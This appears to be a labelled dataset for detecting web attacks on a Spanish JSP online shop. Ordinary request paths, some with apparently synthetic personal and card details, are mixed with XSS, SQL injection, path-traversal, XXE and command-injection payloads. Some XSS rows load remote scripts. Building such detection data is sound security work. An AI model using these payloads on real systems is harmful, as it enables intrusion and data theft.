payload,type
miembros/imagenes/zarauz.jpg,normal
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
miembros/index.jsp,normal
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript&#058;alert('XSS');\""&gt;",xss
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
publico/pagar.jsp?modo=insertar&precio=4228&B1=Pasar+por+caja,normal
)%20OR%20(SELECT%20password%20FROM%20users%20...,sqli
imagenes/logo.gif,normal
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},traversal
"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
imagenes/3.gif,normal
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
publico/registro.jsp?modo=registro&login=elliott&password=DigitAD%24A&nombre=Hildebaldo&apellidos=Camarillo+Guillen&email=armstrong%40viajesnacionales.pn&dni=68623074K&direccion=C%2F+Cubillo+Aragon+45+&ciudad=Solanillos+del+Extremo&cp=33423&provincia=Huelva&ntc=8388803635652672&B1=Registrar,normal
"'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'",sqli
global/titulo.jsp,normal
publico/pagar.jsp?modo=insertar&precio=7549&B1=Pasar+por+caja,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/1.gif,normal
publico/registro.jsp?modo=registro&login=falicov&password=desafinar&nombre=Caleb&apellidos=Hubach+Larrumbe&email=ranez%40sandrasummer.bi&dni=98501968Y&direccion=Calle+Rafael+Bravo+Gomez+179+5%3FH&ciudad=Santa+Marta+de+Tormes&cp=44394&provincia=%C1vila&ntc=1091303634326853&B1=Registrar,normal
"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/index.jsp,normal
"UEvkn: select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1",sqli
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",xss
miembros/fotos.jsp,normal
miembros/imagenes/castro.jpg,normal
imagenes/3.gif,normal
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
global/titulo.jsp,normal
miembros/index.jsp,normal
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
..%25c1%259c..%25c1%259c{FILE},traversal
global/creditos.jsp,normal
imagenes/2.gif,normal
"<body onload=""document.vulnerable=true;"">",xss
miembros/salir.jsp,normal
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
publico/miembros.jsp,normal
publico/autenticar.jsp?modo=entrar&login=el-gueba&pwd=9nte0uer3o&remember=off&B1=Entrar,normal
miembros/salir.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
hi or a=a,sqli
imagenes/1.gif,normal
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
%252e%252e/%252e%252e/{FILE},traversal
global/estilos.css,normal
miembros/imagenes/castro.jpg,normal
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
imagenes/1.gif,normal
"""`'><script>\xE2\x80\x84javascript:alert(1)</script>",xss
&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;,xss
imagenes/3.gif,normal
&no&1: select * from users where id=1 or $<\ or 1=1 -- 1,sqli
"""><img src=x onerror=javascript:alert(""A"")>",xss
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE},traversal
"""/></a></><img src=1.gif onerror=alert(1)>",xss
global/titulo.jsp,normal
miembros/salir.jsp,normal
"1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1",sqli
"admin"" or 1=1--",sqli
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss
"sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'",sqli
"""`'><script>-javascript:alert(1)</script>",xss
publico/caracteristicas.jsp?id=2,normal
publico/carrito.jsp,normal
publico/productos.jsp,normal
miembros/fotos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=timms&pwd=95%216a752a&remember=on&B1=Entrar,normal
miembros/imagenes/ogono.jpg,normal
"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
"""<EMBED SRC=""""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="""" type=""""image/svg+xml"""" AllowScriptAccess=""""always""""></EMBED>""",xss
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
"sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'",sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"""`'><script>\x0Ajavascript:alert(1)</script>",xss
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
global/menum.jsp,normal
<script>javascript:alert(1)</script\x0A,xss
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=49&B1=A%F1adir+al+carrito,normal
imagenes/logo.gif,normal
"s(os: select * from users where id=1 or ""(&"" or 1=1 -- 1",sqli
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",xss
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE},traversal
1};a=eval;b=alert;a(b(14));//,xss
&#X00003c;,xss
on&1c: select * from users where id=1 <@$ or 1=1 -- 1,sqli
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
"<div style=""behaviour: url([link to code]);"">",xss
miembros/imagenes/zarauz.jpg,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=22&B1=A%F1adir+al+carrito,normal
"so(.): select * from users where id='1' + (\.) union select 1,@@VERSION -- 1'",sqli
' or 1=1 /*,sqli
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",sqli
index.jsp,normal
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>,xss
global/creditos.jsp,normal
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
global/creditos.jsp,normal
miembros/index.jsp,normal
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE},traversal
imagenes/nuestratierra.jpg,normal
publico/caracteristicas.jsp?id=2,normal
publico/miembros.jsp,normal
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;",xss
"""><img src=x onerror=javascript:alert((A))>",xss
../..//../..//../..//../{FILE},traversal
publico/carrito.jsp,normal
global/creditos.jsp,normal
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;,xss
"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",xss
miembros/imagenes/castro.jpg,normal
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
"UE1nk: select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1",sqli
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,xss
..%252f..%252f..%252f..%252f..%252f{FILE},traversal
imagenes/logo.gif,normal
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert('xss')</script>""> </body></html>",xss
publico/caracteristicas.jsp?id=1,normal
%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,traversal
miembros/editar.jsp?modo=registro&login=baggerma&password=0e8v88E&nombre=Dionio&apellidos=Arceo+Feliu&email=goldman%40casabolsa43.rw&dni=06966107M&direccion=Calle+Santa+Escolastica%2C+184+&ciudad=Sollana&cp=17534&provincia=Murcia&ntc=7840792716096931&B1=Registrar,normal
miembros/imagenes/zarauz.jpg,normal
' or 'text' = n'text',sqli
"<IMG SRC=""livescript:[code]"">",xss
'&',sqli
<script>/* *\x00/javascript:alert(1)// */</script>,xss
publico/caracteristicas.jsp?id=1,normal
"s,UEf: select * from users where id=1 or 1#"", union select version(),version() -- 1",sqli
global/titulo.jsp,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=24&B1=A%F1adir+al+carrito,normal
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=39&B1=A%F1adir+al+carrito,normal
..%255c..%255c..%255c..%255c..%255c{FILE},traversal
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
"<embed src=""javascript:alert(1)"">",xss
miembros/imagenes/ogono.jpg,normal
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
imagenes/3.gif,normal
miembros/imagenes/castro.jpg,normal
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
publico/autenticar.jsp?modo=entrar&login=baziuk4&pwd=376g%E1stu90&remember=off&B1=Entrar,normal
imagenes/cmenbul.gif,normal
global/creditos.jsp,normal
"' union select * from users where login = char(114,111,111,116);",sqli
publico/carrito.jsp,normal
"vc: select * from users where id=1 + @<1# union select 1,version() -- 1",sqli
publico/miembros.jsp,normal
 or a=a,sqli
imagenes/3.gif,normal
<script>+-+-1-+-+alert(1)</script>,xss
<script>alert('XSS')</script>,xss
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",xss
@variable,sqli
publico/productos.jsp,normal
miembros/editar.jsp?modo=registro&login=chaiman&password=ge2613an0&nombre=Zulaica&apellidos=Castellanos+G%F2dia&email=weinberger%40privatebanking.com.nz&dni=27340064X&direccion=San+Ambrosio+65+6%3FH&ciudad=Vega+de+Valcarce&cp=01548&provincia=A+Coru%F1a&ntc=4592439732004751&B1=Registrar,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/cmenbul.gif,normal
imagenes/nuestratierra.jpg,normal
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",xss
publico/carrito.jsp,normal
.on&1: select * from users where id=1.<@$ or 1=1 -- 1,sqli
global/creditos.jsp,normal
imagenes/1.gif,normal
../../../../../{FILE},traversal
imagenes/1.gif,normal
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",xss
global/creditos.jsp,normal
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",xss
"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
miembros/imagenes/castro.jpg,normal
index.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",sqli
imagenes/logo.gif,normal
publico/registro.jsp?modo=registro&login=cairisti&password=0a31e7a4&nombre=Luciano&apellidos=%C1vila+Kusanovic&email=moston%40sierradealcaraz.sg&dni=78128253J&direccion=Moncayo+46%2C+&ciudad=Cigudosa&cp=02649&provincia=Huesca&ntc=2771560137305516&B1=Registrar,normal
imagenes/1.gif,normal
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",xss
imagenes/3.gif,normal
miembros/editar.jsp?modo=registro&login=reinald&password=MAchAc%24AdA&nombre=Vitalia&apellidos=Giribet+Armis%E9n&email=lundigan%403horas.gob&dni=83475055M&direccion=Patio+Susi+120%2C+&ciudad=Oca%F1a&cp=10161&provincia=Soria&ntc=6402952155575779&B1=Registrar,normal
global/menum.jsp,normal
imagenes/cmenbul.gif,normal
%2e%2e\{FILE},traversal
imagenes/nuestratierra.jpg,normal
<<SCRIPT>%(payload)s//<</SCRIPT>,xss
miembros/imagenes/castro.jpg,normal
a);/usr/bin/id,command_injection
../../../../../../../../../../../../etc/passwd%00,traversal
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
publico/registro.jsp?modo=registro&login=morten&password=sINCr5Nica&nombre=Solano&apellidos=Mera+Alc%E1cer&email=cambre%40be%F1esmer.na&dni=99783130E&direccion=Calle+Hostieros%2C+24+&ciudad=Brihuega&cp=50700&provincia=Cuenca&ntc=3581640568970302&B1=Registrar,normal
publico/caracteristicas.jsp?id=2,normal
"""<style><!--</style><script>document.write(""""XSS-XSS-XSS"""");//--></script>""",xss
"s:UE1: select * from users where id=1 or 1#"": union select 1,version() -- 1",sqli
imagenes/nuestratierra.jpg,normal
"<;SCRIPT a="";blah""; ';'; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/nuestratierra.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/pagar.jsp?modo=insertar&precio=119&B1=Pasar+por+caja,normal
"""<XML ID=""""xss""""><I><B><IMG SRC=""""javas<!-- -->cript:alert('XSS')""""></B></I></XML><SPAN DATASRC=""""#xss"""" DATAFLD=""""B"""" DATAFORMATAS=""""HTML""""></SPAN>""",xss
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
imagenes/2.gif,normal
publico/miembros.jsp,normal
publico/carrito.jsp,normal
miembros/imagenes/ogono.jpg,normal
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
publico/pagar.jsp?modo=insertar&precio=6534&B1=Confirmar,normal
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
&{document.vulnerable=true;};,xss
miembros/imagenes/ogono.jpg,normal
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/registro.jsp?modo=registro&login=marg&password=77603O8adA&nombre=Brayam&apellidos=Cheres+Ochoa&email=salvilla%40mtos.pr&dni=02124892Z&direccion=Petxina%2C+77%2C+2B&ciudad=Vallanca&cp=34475&provincia=Valencia&ntc=6113595872626667&B1=Registrar,normal
1 or 1=1,sqli
"""<BGSOUND SRC=""""javascript:alert('XSS');"""">""",xss
miembros/index.jsp,normal
imagenes/logo.gif,normal
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,xss
"""<div style=""""binding: url([link to code]);""""> [Mozilla]""",xss
global/estilos.css,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/autenticar.jsp?modo=entrar&login=lijphart&pwd=*ramonear&remember=off&B1=Entrar,normal
imagenes/3.gif,normal
miembros/imagenes/zarauz.jpg,normal
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",xss
global/titulo.jsp,normal
"<script src=""/\%(jscript)s""></script>",xss
publico/miembros.jsp,normal
0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE},traversal
imagenes/2.gif,normal
"UEov,: select * from users where id=1 union select !<@,version() -- 1",sqli
miembros/imagenes/zarauz.jpg,normal
global/menum.jsp,normal
global/estilos.css,normal
.\..\.\..\.\..\.\..\.\..\{FILE},traversal
index.jsp,normal
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
../../../../../../../../etc/passwd,traversal
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///dev/random"">]><foo>&xee;</foo>",xss
"&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
"<IMG SRC=""javascript:javascript:alert(1)""",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,xss
miembros/imagenes/zarauz.jpg,normal
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",xss
miembros/imagenes/castro.jpg,normal
imagenes/3.gif,normal
miembros/fotos.jsp,normal
"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
..//{FILE},traversal
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",xss
miembros/fotos.jsp,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=35&B1=A%F1adir+al+carrito,normal
"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=5&B1=A%F1adir+al+carrito,normal
imagenes/3.gif,normal
"sn:s: select * from users where id=1 or ""$:"" or 1=1 -- 1",sqli
&#x003C,xss
global/menum.jsp,normal
imagenes/3.gif,normal
miembros/imagenes/ogono.jpg,normal
' or 1=1--,sqli
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
imagenes/cmenbul.gif,normal
"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",xss
index.jsp,normal
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,xss
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;",xss
..%uEFC8..%uEFC8..%uEFC8{FILE},traversal
global/titulo.jsp,normal
publico/carrito.jsp,normal
global/menum.jsp,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/cmenbul.gif,normal
<%<!--'%><script>alert(1);</script -->,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/pagar.jsp?modo=insertar&precio=4427&B1=Confirmar,normal
..\\\..\\\..\\\{FILE},traversal
publico/carrito.jsp,normal
